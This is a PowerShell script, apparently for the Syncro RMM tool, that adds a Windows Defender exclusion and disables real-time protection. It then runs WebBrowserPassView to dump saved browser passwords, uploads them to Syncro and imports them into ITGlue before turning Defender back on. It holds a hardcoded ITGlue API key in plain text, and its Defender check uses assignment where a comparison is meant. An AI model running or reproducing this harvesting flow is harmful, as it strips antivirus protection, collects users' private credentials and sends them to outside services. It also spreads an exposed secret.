Import-Module $env:SyncroModule
## 

#Adds an exclusion to Windows Defender for Path C:\Techtools
Add-MpPreference -ExclusionPath "C:\Techtools"

#Disables Windows Defender
$defenderOptions = Get-MpComputerStatus 
$defenderOn = $defenderOptions.RealTimeProtectionEnabled
    
if($defenderOn = $true){
Set-MpPreference -DisableRealtimeMonitoring $true
}

Start-Process -FilePath "C:\TechTools\pw\WebBrowserPassView.exe" -ArgumentList "/LoadPasswordsIE 1 /LoadPasswordsFirefox 1 /LoadPasswordsChrome 1 /LoadPasswordsOpera 1 /LoadPasswordsSafari 1 /scomma C:\TechTools\pw\WebBrowserPassView.csv"
Upload-File -Subdomain "supportit" -FilePath "C:\TechTools\pw\WebBrowserPassView.csv"

Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
Install-Module -Name ITGlueAPI -Force
Import-Module ITGlueAPI -DisableNameChecking
Add-ITGlueAPIKey -Api_Key ITG.64f6ed5ede23d9bfb823590c01d642fb.dFS-UVh2Nq-dlKFy5c8N1lg0CtEUDx2ai1FHOMbScPpoaeKrSGjmVqDE3qCWxEm3

Write-Host "Searching for $account_name in ITGlue"

$results = Get-ITGlueOrganizations -filter_name $account_name

$org_id = $results.data.id
#Add error check for if the orginization exists in Syncro. If not prompt user to syncronize the Syncro user to ITGlue and exit the script.

if($org_id -eq $null){
    Write-Host "Company doesn't exist in ITGlue. Go to ITGlue and synchronize the Company from Syncro into ITGlue."
    #Exit 2
}
Write-Host "$org_id"

$csv = Import-csv 'C:\TechTools\pw\WebBrowserPassView.csv'
$import_payload = @()
foreach($item in $csv)
   {
   $import_payload += @{'type' = 'passwords'
       'attributes' = @{'url' = $item.URL
           'name' = $item.'User Name' + ' ' + $item.URL
           'username' = $item.'User Name'
           'password' = $item.Password
           'notes' = 'Created at: ' + $item.'Created Time' + ' from asset: ' + $asset_name
       }}
   }
   $import_payload
New-ITGluePasswords -organization_id $org_id -data $import_payload

#Delete PW Directory
Remove-Item -Path 'C:\TechTools\pw' -recurse -force

#Enables Windows Defender
if($defenderOn = $true){
Set-MpPreference -DisableRealtimeMonitoring $false
}